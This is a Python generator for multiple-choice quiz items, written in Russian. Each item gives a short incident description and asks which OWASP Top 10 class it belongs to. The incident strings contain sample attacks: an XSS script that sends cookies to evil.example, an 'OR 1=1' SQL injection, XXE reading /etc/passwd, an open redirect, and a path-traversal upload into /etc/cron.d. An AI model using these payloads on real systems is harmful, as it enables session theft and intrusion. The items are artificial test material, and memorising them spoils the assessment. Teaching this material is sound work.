"""Распознавание класса уязвимости OWASP Top 10 по описанию инцидента."""
from __future__ import annotations
import random
from ..base import template, Instance, shuffle_options
from ..common import _run_python, _sql_eval, _sql_block, _choice, _multi


@template("gen_security_owasp_incident_choice", title="Класс уязвимости по описанию инцидента",
          competency="Основы ИБ: OWASP Top 10",
          specializations=["security"], technologies=["security_basics", "networking"],
          fmt="choice", grade_level="junior", difficulty_shift=-0.2)
def _security_owasp_incident(rng: random.Random) -> Instance:
    user = rng.choice(["Иван", "Пётр", "Мария", "Алексей", "Ольга", "Сергей", "Дмитрий"])
    host = rng.choice(["shop.example.com", "portal.example.com", "api.example.com", "crm.example.com"])
    param = rng.choice(["id", "user", "order", "doc", "page"])
    tbl = rng.choice(["users", "orders", "accounts", "documents"])
    field = rng.choice(["комментарий", "имя пользователя", "отзыв", "название товара"])

    cases = [
        (
            f"Пользователь {user} открыл страницу https://{host}/profile?{param}=1 и вручную заменил значение "
            f"на 1 OR 1=1. Сервер вернул данные всех пользователей.",
            "SQL-инъекция (A03: Injection)",
            "Ввод подставляется в SQL-запрос без параметризации, поэтому условие OR 1=1 делает его всегда истинным.",
        ),
        (
            f"В поле «{field}» пользователь {user} ввёл <script>fetch('https://evil.example/?c='+document.cookie)</script>. "
            f"Этот текст сохранился в базе и выполнился в браузере других пользователей.",
            "Межсайтовый скриптинг (XSS, A03: Injection)",
            "Скрипт из пользовательских данных выводится в HTML без экранирования и исполняется в браузере жертвы.",
        ),
        (
            f"Пользователь {user} изменил в браузере адрес https://{host}/orders/{tbl}/42 на "
            f"https://{host}/orders/{tbl}/43 и увидел чужой заказ, хотя в интерфейсе такой ссылки не было.",
            "Небезопасная прямая ссылка на объект (IDOR, A01: Broken Access Control)",
            "Сервер не проверяет, что объект принадлежит текущему пользователю, — это IDOR (CWE-639) в рамках A01.",
        ),
        (
            f"Форма входа на https://{host}/login не ограничивает число попыток: по учётной записи пользователя "
            f"{user} за ночь перебрали десятки тысяч паролей из утёкших баз, и один подошёл.",
            "Ошибки идентификации и аутентификации (A07: Identification and Authentication Failures)",
            "Нет защиты от перебора и подстановки утёкших паролей, пароли слабые — это ошибки аутентификации (A07, CWE-307).",
        ),
        (
            f"Сервер получил XML от пользователя {user} с объявлением внешней сущности, которая прочитала файл "
            f"/etc/passwd и вернула его содержимое в ответе.",
            "Внедрение внешних XML-сущностей (XXE, A05: Security Misconfiguration)",
            "Разбор XML с включёнными внешними сущностями позволяет читать локальные файлы и обращаться к внутренним сервисам.",
        ),
        (
            f"Пользователь {user} отправил запрос на https://{host}/redirect?url=https://evil.example и сервер "
            f"перенаправил его туда; жертва ввела пароль на поддельной странице.",
            "Небезопасное перенаправление (A01: Broken Access Control)",
            "Сервер доверяет параметру url и перенаправляет на чужой домен — это открытый редирект.",
        ),
        (
            f"База пользователей {host} хранит пароли без соли, простым MD5; после утечки дампа атакующий "
            f"быстро восстановил пароли большинства пользователей.",
            "Криптографические сбои (A02: Cryptographic Failures)",
            "Хранение паролей без стойкого солёного хеширования — криптографический сбой (A02; в редакции 2017 — Sensitive Data Exposure).",
        ),
        (
            f"Пользователь {user} загрузил файл с именем ../../../../etc/cron.d/backdoor и сервер сохранил его "
            f"за пределы каталога загрузок.",
            "Обход пути (Path Traversal, A01: Broken Access Control)",
            "Сервер не нормализует имя файла, поэтому ../ позволяет выйти за пределы разрешённого каталога.",
        ),
    ]

    idx = rng.randrange(len(cases))
    text, correct, expl = cases[idx]

    all_correct = [c[1] for c in cases]
    # OWASP A07 прямо отсылает небезопасное хранение паролей к A02, поэтому для случая со слабым
    # хешированием нельзя предлагать A07 как «неправильный» вариант — он не однозначно неверен.
    a02 = "Криптографические сбои (A02: Cryptographic Failures)"
    a07 = "Ошибки идентификации и аутентификации (A07: Identification and Authentication Failures)"
    conflict = {a02: a07, a07: a02}.get(correct)
    pool = [c for c in all_correct if c != correct and c != conflict]
    wrong = rng.sample(pool, 3) + [
        "Межсайтовая подделка запроса (CSRF, A01: Broken Access Control)",
        "Уязвимость компонента с известной CVE (A06: Vulnerable and Outdated Components)",
    ]
    options = [correct] + wrong
    return _choice(
        rng,
        "Инцидент: " + text + " К какому классу уязвимостей OWASP Top 10 (2021) он относится?",
        options,
        0,
        expl,
    )
